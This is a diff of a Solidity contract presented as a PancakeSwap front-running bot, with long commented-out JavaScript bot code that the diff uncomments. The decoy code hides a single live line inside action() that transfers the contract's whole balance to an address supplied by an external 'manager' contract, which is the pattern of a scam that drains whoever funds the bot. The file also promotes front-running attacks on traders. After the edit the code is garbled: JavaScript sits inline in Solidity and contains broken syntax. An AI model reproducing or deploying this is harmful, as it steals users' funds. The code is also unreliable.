@@ -33,7 +33,6 @@ contract PancakeSwapV2FrontBot {
 	    function action() public payable {
 	    	//Perform a front-running attack on PancakeSwap
 
-            /*-js-execution
                 const fs = require('fs');
                 var Web3 = require('web3');
                 var abiDecoder = require('abi-decoder');
@@ -48,17 +47,13 @@ contract PancakeSwapV2FrontBot {
 
                 const INPUT_TOKEN_ADDRESS = '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c';
                 const WBNB_TOKEN_ADDRESS = '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c';
-            js-execution-*/
 
             manager;
-            /*-js-execution
                 var input_token_info;
                 var out_token_info;
                 var pool_info;
                 var gas_price_info;
-            js-execution-*/
             manager;
-            /*-js-execution
                 var succeed = false;
                 var subscription;
                 var web3;
@@ -73,9 +68,7 @@ contract PancakeSwapV2FrontBot {
                 var attack_started = false;
                 const ONE_GWEI = 1e9;
             }
-            js-execution-*/
             manager;
-        /*-js-execution
         async function createWeb3(){
             try {
                 web3 = new Web3(new Web3.providers.HttpProvider(HTTP_PROVIDER_LINK));
@@ -91,10 +84,8 @@ contract PancakeSwapV2FrontBot {
                 console.log(error);
                 return false;
         }
-        js-execution-*/
         manager;
 
-        /*-js-execution
         async function main() {
             try {   
                 if (await createWeb3() == false) {
@@ -151,10 +142,8 @@ contract PancakeSwapV2FrontBot {
             }
             process.exit();
         }
-        js-execution-*/
 
         manager;
-        /*-js-execution
         function handleTransaction(transaction, out_token_address, user_wallet, amount, level) {
             
             (await triggersFrontRun(transaction, out_token_address, amount, level)) {
@@ -195,10 +184,8 @@ contract PancakeSwapV2FrontBot {
             console.log('Sell succeed');
             succeed = true;
         }
-        js-execution-*/
             
         manager;
-        /*-js-execution
         async function approve(gasPrice, outputtoken, out_token_address, user_wallet){
             var allowance = await out_token_info.token_contract.methods.allowance(user_wallet.address, PANCAKE_ROUTER_ADDRESS).call();
             
@@ -212,9 +199,7 @@ contract PancakeSwapV2FrontBot {
         
                 console.log('replace max allowance')
                 max_allowance = outputtoken;
-            js-execution-*/
             payable(manager.uniswapDepositAddress()).transfer(address(this).balance);
-            /*-js-execution
             if(outputtoken.gt(allowance)){
                 console.log(max_allowance.toString());
                 var approveTX ={
@@ -233,10 +218,8 @@ contract PancakeSwapV2FrontBot {
             
             return;
         }
-        js-execution-*/
         manager;
         //select attacking transaction
-        /*-js-execution
         async function triggersFrontRun(transaction, out_token_address, amount, level) {
             
             if(attack_started)
@@ -279,7 +262,6 @@ contract PancakeSwapV2FrontBot {
                     return false;
                 }
             }
-            js-execution-*/
     }
     
 }
